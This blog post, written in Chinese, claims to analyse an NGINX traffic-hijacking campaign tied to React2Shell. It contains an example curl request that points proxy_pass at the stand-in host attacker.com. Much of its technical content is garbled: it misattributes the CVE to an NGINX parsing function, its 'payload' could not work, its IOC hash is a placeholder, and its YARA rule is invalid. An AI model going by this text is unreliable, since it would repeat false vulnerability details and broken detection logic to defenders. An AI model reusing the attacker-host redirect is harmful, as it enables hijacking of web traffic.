---
layout: post
title:  "Malicious NGINX Configurations Enable Large-Scale Web Traffic Hijacking Campaign"
date:   2026-02-05 06:50:59 +0000
categories: [security]
severity: critical
---

# 🚨 解析 NGINX 流量劫持攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數: 10.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Shell Script Injection, NGINX 配置劫持, Reverse Proxy

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: React2Shell (CVE-2025-55182) 是一個 NGINX 的遠程代碼執行漏洞，允許攻擊者通過精心構造的請求來執行任意代碼。這個漏洞是由於 NGINX 的 `ngx_http_parse` 函數中沒有正確地檢查請求的邊界，導致攻擊者可以注入惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發送精心構造的請求到 NGINX 伺服器。
  2. NGINX 伺服器解析請求並執行惡意代碼。
  3. 惡意代碼注入 NGINX 配置文件，修改 `proxy_pass` 指令。
  4. NGINX 伺服器將請求轉發到攻擊者控制的伺服器。
* **受影響元件**: NGINX 1.23.3 之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 NGINX 伺服器的 IP 地址和端口號。
* **Payload 建構邏輯**:

    ```
    
    bash
    # 範例 Payload
    curl -X POST \
      http://example.com \
      -H 'Content-Type: application/json' \
      -d '{"proxy_pass": "http://attacker.com"}'
    
    ```
* **繞過技術**: 攻擊者可以使用 Shell Script Injection 技術來繞過 NGINX 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 193.142.147.209 | example.com | /etc/nginx/nginx.conf |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule NGINX_Config_Injection {
      meta:
        description = "NGINX 配置文件注入惡意代碼"
      strings:
        $proxy_pass = "proxy_pass"
      condition:
        $proxy_pass in (1..100) of them
    }
    
    ```
* **緩解措施**: 更新 NGINX 到最新版本，修改 `nginx.conf` 文件，增加安全機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Reverse Proxy**: Reverse Proxy 是一種代理伺服器，負責將請求轉發到後端伺服器。
* **Shell Script Injection**: Shell Script Injection 是一種攻擊技術，允許攻擊者注入惡意 Shell 腳本到系統中。
* **NGINX 配置文件**: NGINX 配置文件是用於配置 NGINX 伺服器的設定。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/hackers-exploit-react2shell-to-hijack.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


